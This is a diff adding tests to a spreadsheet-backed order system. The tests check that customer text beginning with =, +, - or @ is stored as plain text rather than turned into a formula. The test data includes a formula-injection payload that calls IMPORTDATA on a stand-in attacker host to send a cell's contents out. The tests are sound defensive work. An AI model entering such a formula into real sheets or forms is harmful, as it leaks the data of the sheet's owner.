@@ -122,3 +122,38 @@ test('an unknown shop code is rejected', () => {
   assert.deepEqual(post(guestOrder({ shop_code: 'ZZZZZZZZ22', customer: { phone: '' } })), { ok: false, error: 'unknown_shop' });
   assert.equal(sheet('Order').records().length, 0);
 });
+
+// ---- 2026-10-23 night: text that starts with = + - @ must never become a formula in the sheet ----
+// (A formula such as =IMPORTDATA("https://…"&A2) typed into the order form could send sheet data out.)
+const NASTY = ['=IMPORTDATA("https://evil.example/?"&A2)', '+66 2 000 0000', '-no chilli', '@ken'];
+const noFormulas = ss => [...ss.sheets].flatMap(([n, s]) => s.cells.flat().filter(v => String(v).startsWith('FORMULA(')).map(v => `${n}: ${v}`));
+
+test('a guest order writes formula-looking text as plain text everywhere', () => {
+  const { post, ss, sheet } = ready();
+  const res = post(guestOrder({
+    customer: { shop_name: NASTY[0], contact_name: NASTY[1], phone: '0812345678', line_name: NASTY[3] },
+    delivery: { date: '2026-10-25', address_note: NASTY[2] },
+    note: NASTY[0],
+    items: [{ sku: 'PK-001', name_th: NASTY[0], qty: 1, qty_unit: '=kg', unit_price: 10, line_total: 10 }],
+    total: 10,
+  }));
+  assert.equal(res.ok, true);
+  assert.deepEqual(noFormulas(ss), []);
+  const [order] = sheet('Order').records();
+  assert.equal(order.Web_Shop_Name, NASTY[0]);
+  assert.equal(order.Web_Note, `${NASTY[2]} | ${NASTY[0]} | LINE: ${NASTY[3]}`);
+  const [c] = sheet('Master').records();
+  assert.deepEqual([c.Name, c.Contact_Name, c.LINE_Name, c.Address], [NASTY[0], NASTY[1], NASTY[3], NASTY[2]]);
+  const [item] = sheet('Order_Items').records();
+  assert.deepEqual([item.Name_TH, item.Qty_Unit], [NASTY[0], '=kg']);
+});
+
+test('a shop-QR order copies formula-looking Master text as plain text', () => {
+  const { post, ss, sheet } = ready();
+  // Master already holds this as text (typed with an apostrophe, or written by the admin page).
+  addShop(sheet('Master'), { name: "'" + NASTY[0], address: "'" + NASTY[2] });
+  const res = post(guestOrder({ shop_code: 'ABCDEFGH23', customer: { phone: '' }, delivery: { date: '2026-10-25', address_note: '' } }));
+  assert.equal(res.ok, true);
+  assert.deepEqual(noFormulas(ss), []);
+  assert.equal(sheet('Order').records()[0].Web_Shop_Name, NASTY[0]);
+});
